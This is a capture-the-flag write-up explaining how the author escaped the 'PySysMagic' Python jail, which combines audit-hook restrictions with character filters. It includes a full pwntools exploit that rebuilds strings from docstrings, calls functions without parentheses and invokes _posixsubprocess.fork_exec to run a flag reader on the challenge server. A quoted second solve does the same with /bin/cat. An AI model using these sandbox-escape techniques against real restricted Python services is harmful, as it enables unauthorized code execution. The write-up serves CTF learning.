# PySysMagic (2 solves)

```sh
obligatory pyjail + PyMagic = ?
nc 34.139.98.117 6669

Author: ahh
```

I partecipated to the first edition of `L3ak CTF` with `FoocHackz`. I solved this challenge, it wasn't hard but writing a working exploit took me at least one/two hours.

## Index
 - [Index](#index)
 - [Overview](#overview)
    - [Source](#source)
    - [A bit of Py-Magic](#a-bit-of-py-magic)
    - [Obligatory Pyjail](#obligatory-pyjail)
    - [Building payloads from docs](#building-payloads-from-docs)
 - [Solve](#solve)
    - [Flag](#flag)
 - [Considerations](#considerations)
 - [Source](#source)


## Overview
As the title of the challenge suggests, it's a pyjail. To be more precise, two challenges from two different CTFs were merged together
 - `obligatory pyjail` from `LIT CTF 2023`
 - `PyMagic` from `TCP1P CTF 2023`

So, with that in mind, let's take a look at the source code

### Source

We're given a bunch of files but these are the most important ones
 - `audit_sandbox.c` a C program which uses [Audit Hooks](https://peps.python.org/pep-0578/) to implement a whitelist sandbox. The only audit events we're allowed to use are `compile` and `exec`
 - `chall.py` the actual challenge script

```py
# python3.10 chall.py build
# obligatory pyjail + PyMagic = ?

import os, sys
from distutils.core import Extension, setup

... # Useless stuff
    
code = input(">>> ")
import sys
import audit_sandbox

audit_sandbox.install_hook()
del audit_sandbox
del sys.modules["audit_sandbox"]
del sys

import re


class ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz:
    ...  # ill be nice :)


eval = eval
if not re.findall("[()'\"0123456789 ]", code):
    for k in (b := __builtins__.__dict__).keys():
        b[k] = None

    eval(code, {"__builtins__": {}, "_": ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz})
else:
    print("Nope.")
```

A lot of things immediately catch the eye
 - All builtin functions are _apparently_ deleted except `eval` but can be accessed from the `__main__` module
 - `()` and numbers are not allowed 
 - `'`, `"` and `[space]` are not allowed
 - A cool gadget called `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz` is given to us

If there had been `exec` instead of `eval`, we could have used [decorators](https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-function-calls)!

### A bit of Py-Magic

In this case, we can use a cool trick from the `PyMagic` challenge mentioned above

```py
...

def call_function(f, arg):
	return (f"[[None for _.__class_getitem__ in [{f}]],"
		f"_[{arg}]][True]")

...
```

Thanks to [`__class_getitem__`](https://peps.python.org/pep-0560/#class-getitem) we're able to call any function without using brackets

```py
[
    [
        None for _.__class_getitem__ in [int] # Equivalent of _.__class_getitem__ = int
    ],
    _['12'] # Calling _.__class_getitem__ -> int
][True] # Get the return value
```

But using this method, we have limitations: we are forced to pass only one argument to a function

### Obligatory pyjail

Ok now we need to bypass the audit sandbox. The file called `audit_sandbox.c` was actually ~~stolen~~ taken from `LIT CTF 2023`

Let's just take a look the solve for `obligatory pyjail` (Credits to flocto)

```py
[lm:=().__class__.__base__.__subclasses__()[104].load_module,p:=__import__("os").pipe,_ps:=lm("_posixsubprocess"),_ps.fork_exec([b"/bin/cat", b"flag.txt"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(p()), False, False, None, None, None, -1, None)]
```

So using `_posixsubprocess.fork_exec` we bypass that sandobx. Cool, but there's a catch: `fork_exec` requires exactly 21 arguments. As I said before, we're allowed to pass exactly 1 argument using `_.__class_getitem__`

And now what?

## Building payloads from docs

I specified earlier that `eval` is not completely deleted. In fact, we can access it from the `__main__` module. Since we can't import anything, we can reach the `sys` module from some objects found in `().__class__.__base__.__subclasses()` andd then access to `eval` using `sys.modules['__main__']`

But how can `eval` be useful to us?

Our goal is to call `fork_exec` passing to it 21 arguments. We can build payloads from scratch using docs (eg. `[].__doc__`). If some characters are not in the docs, we can get them from `_.__qualname__`

So, our main idea would be:
 - Build a payload from docs which would call `_posixsubprocess.fork_exec`
 - Reach `__main__.eval`
 - Call it and pass the payload as the first argument
 - Profit

## Solve

I copy pasted the solve for `PyMagic`, you can find it [here](https://github.com/SuperStormer/writeups/blob/master/tcp1pctf_2023/misc/pymagic/solve_pymagic.py) (Credits to SuperStormer)


```py
from pwn import *

def gen_int(i):
        if i == 0:
                return "False"
        else:
                return "--".join(["True"] * i)

def call_function(f, arg):
        return (f"[[None for _.__class_getitem__ in [{f}]],"
                f"_[{arg}]][True]")

type_s = "_.__class__"
object_s = "_.__base__"
subclasses = call_function(type_s + ".__subclasses__", object_s) # _.__class__.__subclasses__(_.__base__)

wrap_close = f"{subclasses}[{gen_int(137)}]" # os._wrap_close
os_module = f"{wrap_close}.__init__.__globals__"

class ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz:pass

def build_string(string):
    src = [].__doc__.__doc__ + {}.__doc__
    final = ""
    for x in string:
        fromdoc = (a:=src.find(x)) != -1
        if fromdoc:
            final += f"[[].__doc__.__doc__+{{}}.__doc__][False][{gen_int(a)}]+"
        else: final += f"_.__qualname__[{gen_int(ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.__qualname__.find(x))}]+" if ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.__qualname__.find(x) != -1 else f"{call_function('_.__class__.__subclasses__', '_.__base__')}[{gen_int(14)}].__doc__[True]+"
    return final[:-1]


sys_s = f"[*{os_module}][{gen_int(9)}]"
sys_modules = f"{os_module}[{sys_s}].modules"

main_module_s = f"[*{sys_modules}][{gen_int(22)}]"
eval_func = f"{sys_modules}[{main_module_s}].eval"

to_eval = build_string(f"[(os_module:=().__class__.__base__.__subclasses__()[{gen_int(137)}].__init__.__globals__).__class__,(sys:=os_module['sys']).__class__,sys.modules['_posixsubprocess'].fork_exec([f'.{{True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c}}readflag'.encode()],[f'.{{True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c}}readflag'.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module['pipe']()),False,False,None,None,None,-True,None)]")

system_sh = call_function(eval_func, to_eval).replace(' ', '\t')


r = remote("34.139.98.117", 6669)
r.sendline(system_sh)
r.interactive()
```

Let's break it down
 - `gen_int` Since numbers cannot be used, they can be generated from booleans (eg. `3` becomes `True -- True -- True`). I used `--` instead of `+` because I couldn't find `+` inside the docs
 - `build_string` `"` and `'` are not allowed so it's possible to build the payload from docs and from `_.__qualname__`
 - `call_function` generate the payload to call a specified function with an argument
 - `subclasses` is the equivalent of `_.__class__.__subclasses__(_.__base__)`, which is the equivalent of `_.__class__.__base__.__subclasses__()`
 - Access `os._wrap_close` (position 137) to recover the `os` module objects
 - Do the same thing for the `sys` module and then recover `__main__.eval`
 - Build the payload which will be passed to `eval`: `[(os_module:=().__class__.__base__.__subclasses__()[137].__init__.__globals__).__class__,(sys:=os_module['sys']).__class__,sys.modules['_posixsubprocess'].fork_exec([f'.{47:c}readflag'.encode()],[f'.{47:c}readflag'.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module['pipe']()),False,False,None,None,None,-True,None)]`
 - Finally, pass that payload to `eval` and proceed to send everything to the remote server

 ### Flag
`L3AK{ok_so_os_wrap_close_works_with_builtin_removal_so_added_audit_sandbox_lol_689db2}`

## Considerations
This is not the intended solution. The author forgot to remove `eval` from the main module. I think the intended one is a lot smaller than mine.

What happens if all modules from `sys.modules` are removed? Is it still solvable?

At the end, it was a fun challenge to solve ❤️

Thanks to the authors for the challenge and for the CTF in general. It's always nice to see pyjails in CTFs!

## Source
You can find the source of this challenge [here](https://github.com/salvatore-abello/pyjail/tree/main/L3ak%20CTF%202024)


**P.S:** Do you need a cheatsheet with many tricks to solve pyjails? If so, [click here!](https://github.com/salvatore-abello/python-ctf-cheatsheet/)
